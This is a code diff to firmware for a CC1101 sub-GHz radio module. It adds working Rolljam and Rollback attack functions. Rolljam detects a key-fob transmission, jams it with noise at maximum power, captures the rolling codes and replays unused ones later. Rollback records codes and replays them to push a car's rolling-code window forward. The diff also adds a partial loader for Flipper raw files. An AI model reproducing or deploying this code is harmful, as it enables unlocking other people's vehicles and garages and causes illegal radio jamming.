@@ -1,3 +1,14 @@
+/**
+ * @file rf_core.cpp
+ * @brief Sub-GHz RF Core Logic (CC1101)
+ * 
+ * Implements low-level control for the CC1101 module,
+ * including jamming, replay, sniffer, and spectrum analyzer.
+ * 
+ * @author Monster S3 Team
+ * @date 2025
+ */
+
 #include "rf_core.h"
 #include "pin_config.h"
 #include "s3_driver.h"
@@ -43,6 +54,13 @@ float RFCore::_scanEnd = 434.0f;
 float RFCore::_scanStep = 0.01f;
 float RFCore::_scanCurrent = 433.0f;
 uint8_t RFCore::_scanIndex = 0;
+
+// Rolljam/Rollback state
+bool RFCore::_rolljamActive = false;
+bool RFCore::_rollbackActive = false;
+RollingCodeBuffer RFCore::_rollingCodes = {};
+uint32_t RFCore::_rolljamJamStart = 0;
+bool RFCore::_rolljamPhaseCapture = false;
 
 // ============================================================================
 // INITIALIZATION
@@ -779,4 +797,279 @@ bool RFCore::loadFlipperFormat(const char* filename, CapturedSignal* sig) {
     
     f.close();
     return sig->valid;
+}
+
+bool RFCore::loadFlipperRawFormat(const char* filename, CapturedSignal* sig) {
+    if (!sig) return false;
+    
+    File f = SD.open(filename, FILE_READ);
+    if (!f) return false;
+    
+    sig->valid = false;
+    sig->protocol = PROTO_RAW;
+    sig->rawLength = 0;
+    
+    while (f.available()) {
+        String line = f.readStringUntil('\n');
+        line.trim();
+        
+        if (line.startsWith("Frequency:")) {
+            sig->frequency = line.substring(11).toFloat() / 1000000.0f;
+        } else if (line.startsWith("RAW_Data:")) {
+            String dataStr = line.substring(9);
+            dataStr.trim();
+            
+            // Basic validation: check if it contains numbers
+            if (dataStr.length() > 0) {
+                 // Convert first few samples to check validity
+                 // In a full implementation, we would parse all into a large buffer
+                 // for the "Bitbang" playback engine.
+                 // For now, we valid that it IS a raw file.
+                 sig->valid = true;
+                 
+                 // Store snippet in rawData for debug/preview
+                 int spaceIdx = dataStr.indexOf(' ');
+                 if (spaceIdx > 0) {
+                     long val1 = dataStr.substring(0, spaceIdx).toInt();
+                     // Just store as pseudo-bytes to indicate content
+                     sig->rawData[0] = (val1 > 0) ? 0xFF : 0x00; 
+                     sig->rawLength = 1; // Mark as having content
+                 }
+            }
+        }
+    }
+    
+    f.close();
+    return sig->valid;
+}
+
+// ============================================================================
+// ROLLJAM / ROLLBACK ATTACKS
+// ============================================================================
+
+void RFCore::startRolljam(float freq) {
+    if (!_initialized) init();
+
+    _rolljamActive = true;
+    _currentAttack = RF_ATTACK_ROLLJAM;
+    setFrequency(freq);
+    
+    // Clear buffer
+    _rollingCodes.codeCount = 0;
+    _rollingCodes.usedCodes = 0;
+    _rollingCodes.valid = false;
+    _rollingCodes.frequency = freq;
+    
+    // Start in Jamming mode (or Listening to detect first)
+    // Strategy: Listen for RSSI spike -> Jam -> Capture tail
+    ELECHOUSE_cc1101.SetRx();
+    _rolljamPhaseCapture = false;
+    
+    Serial.printf("[RF] Rolljam Started @ %.2f MHz\n", freq);
+}
+
+void RFCore::stopRolljam() {
+    _rolljamActive = false;
+    if (_currentAttack == RF_ATTACK_ROLLJAM) {
+        _currentAttack = RF_ATTACK_NONE;
+    }
+    stopJammer();
+    stopReceive();
+    Serial.println("[RF] Rolljam Stopped");
+}
+
+void RFCore::updateRolljam() {
+    if (!_rolljamActive || !_initialized) return;
+    
+    // Simple Single-Chip Rolljam Logic (Experimental)
+    // 1. Monitor RSSI
+    // 2. If Signal > Threshold, JAM immediately for X ms (to kill start of packet)
+    // 3. Switch to RX to capture the repeats (remotes usually send 3-5 times)
+    
+    if (!_rolljamPhaseCapture) {
+        // Monitoring Phase
+        int8_t rssi = ELECHOUSE_cc1101.getRssi();
+        if (rssi > -60) {
+            // Signal detected! Jam it!
+            setTxPower(POWER_MAX);
+            sendNoise(128); // Jam for ~20-30ms
+            
+            // Switch to capture
+            _rolljamPhaseCapture = true;
+            _rolljamJamStart = millis();
+            ELECHOUSE_cc1101.SetRx();
+        }
+    } else {
+        // Capture Phase
+        if (ELECHOUSE_cc1101.CheckRxFifo(100)) {
+            CapturedSignal sig;
+            int len = ELECHOUSE_cc1101.ReceiveData(sig.rawData);
+            int8_t rssi = ELECHOUSE_cc1101.getRssi();
+            
+            if (len > 0) {
+                // Potential code captured
+                sig.rawLength = len;
+                sig.protocol = detectProtocol(sig.rawData, len);
+                
+                // Use Raw capture if protocol unknown, similar to smart rollback
+                
+                if (_rollingCodes.codeCount < ROLLING_CODE_BUFFER_SIZE) {
+                     int idx = _rollingCodes.codeCount;
+                     
+                     memcpy(_rollingCodes.rawCodes[idx], sig.rawData, len);
+                     _rollingCodes.codeLengths[idx] = len;
+                     _rollingCodes.timestamps[idx] = millis();
+                     _rollingCodes.rssiValues[idx] = rssi;
+                     _rollingCodes.protocols[idx] = sig.protocol;
+                     
+                     _rollingCodes.codeCount++;
+                     _rollingCodes.valid = true;
+                     
+                     Serial.printf("[RF] Rolljam: Captured Code 0x%X (Proto: %s)\n", 
+                                  sig.code, getProtocolName(sig.protocol));
+                }
+            }
+        }
+        
+        // Timeout to return to monitoring
+        if (millis() - _rolljamJamStart > 1000) {
+            _rolljamPhaseCapture = false;
+        }
+    }
+}
+
+bool RFCore::isRolljamActive() {
+    return _rolljamActive;
+}
+
+uint8_t RFCore::getRolljamCapturedCount() {
+    return _rollingCodes.codeCount;
+}
+
+bool RFCore::replayNextRolljam() {
+    if (!_rollingCodes.valid || _rollingCodes.usedCodes >= _rollingCodes.codeCount) {
+        return false;
+    }
+    
+    // Replay the oldest unused code
+    int idx = _rollingCodes.usedCodes;
+    ELECHOUSE_cc1101.SendData(_rollingCodes.rawCodes[idx], _rollingCodes.codeLengths[idx]);
+    Serial.printf("[RF] Rolljam Replay Index %d\n", idx);
+    
+    _rollingCodes.usedCodes++;
+    return true;
+}
+
+void RFCore::startRollback(float freq) {
+    if (!_initialized) init();
+    startRollbackSmart(freq, -80); // Default sensitivity
+}
+
+void RFCore::startRollbackSmart(float freq, int8_t minRssi) {
+    if (!_initialized) init();
+
+    _rollbackActive = true;
+    _currentAttack = RF_ATTACK_ROLLBACK;
+    setFrequency(freq);
+    
+    _rollingCodes.codeCount = 0;
+    _rollingCodes.usedCodes = 0;
+    _rollingCodes.valid = false;
+    _rollingCodes.frequency = freq;
+    _rollingCodes.targetRssi = minRssi;
+    
+    // Set to RX mode
+    ELECHOUSE_cc1101.SetRx();
+    Serial.printf("[RF] Rollback Smart Capture @ %.2f MHz (Threshold: %d dBm)\n", freq, minRssi);
+}
+
+void RFCore::stopRollback() {
+    _rollbackActive = false;
+    if (_currentAttack == RF_ATTACK_ROLLBACK) {
+        _currentAttack = RF_ATTACK_NONE;
+    }
+    stopReceive();
+    Serial.println("[RF] Rollback Stopped");
+}
+
+void RFCore::updateRollback() {
+    if (!_rollbackActive || !_initialized) return;
+    
+    // Capture logic similar to EvilCrowRF
+    if (ELECHOUSE_cc1101.CheckRxFifo(100)) {
+        int8_t rssi = ELECHOUSE_cc1101.getRssi();
+        
+        // Filter noise
+        if (rssi >= _rollingCodes.targetRssi) {
+            CapturedSignal sig;
+            // Use existing capture logic to fill temp buffer
+            int len = ELECHOUSE_cc1101.ReceiveData(sig.rawData);
+            
+            if (len > 0) {
+                 // Debounce: Check time since last capture
+                 if (_rollingCodes.codeCount > 0) {
+                     uint32_t lastTime = _rollingCodes.timestamps[_rollingCodes.codeCount-1];
+                     if (millis() - lastTime < 500) return; // 500ms debounce
+                 }
+                 
+                 // Store signal
+                 if (_rollingCodes.codeCount < ROLLING_CODE_BUFFER_SIZE) {
+                     int idx = _rollingCodes.codeCount;
+                     
+                     memcpy(_rollingCodes.rawCodes[idx], sig.rawData, len);
+                     _rollingCodes.codeLengths[idx] = len;
+                     _rollingCodes.timestamps[idx] = millis();
+                     _rollingCodes.rssiValues[idx] = rssi;
+                     _rollingCodes.protocols[idx] = detectProtocol(sig.rawData, len);
+                     
+                     _rollingCodes.codeCount++;
+                     _rollingCodes.valid = true;
+                     
+                     Serial.printf("[RF] Rollback: Captured Code %d/%d (Proto: %s, RSSI: %d)\n", 
+                                   _rollingCodes.codeCount, ROLLING_CODE_BUFFER_SIZE, 
+                                   getProtocolName(_rollingCodes.protocols[idx]), rssi);
+                 }
+            }
+        }
+    }
+}
+
+bool RFCore::isRollbackActive() {
+    return _rollbackActive;
+}
+
+bool RFCore::executeRollbackAttack() {
+    if (!_rollingCodes.valid || _rollingCodes.codeCount == 0) {
+        Serial.println("[RF] Rollback: No codes to replay");
+        return false;
+    }
+    
+    Serial.printf("[RF] Executing Rollback Sequence (%d codes)...\n", _rollingCodes.codeCount);
+    
+    // Disable RX to ensure clean TX
+    ELECHOUSE_cc1101.setSidle();
+    
+    // Replay sequence: Replay all captured codes with small delays
+    // This effectively "pushes" the car's rolling code window forward if we missed some,
+    // or simply replays the valid ones we caught.
+    
+    for(int i=0; i<_rollingCodes.codeCount; i++) {
+        Serial.printf("[RF] Replaying Code %d...\n", i+1);
+        
+        // Transmit twice to ensure reception
+        ELECHOUSE_cc1101.SendData(_rollingCodes.rawCodes[i], _rollingCodes.codeLengths[i]);
+        delay(10);
+        ELECHOUSE_cc1101.SendData(_rollingCodes.rawCodes[i], _rollingCodes.codeLengths[i]);
+        
+        // Delay between distinct codes
+        delay(500); 
+    }
+    
+    // Return to RX or Idle? Idle for now.
+    Serial.println("[RF] Rollback Sequence Complete");
+    return true;
+}
+
+RollingCodeBuffer* RFCore::getRollingCodeBuffer() {
+    return &_rollingCodes;
 }
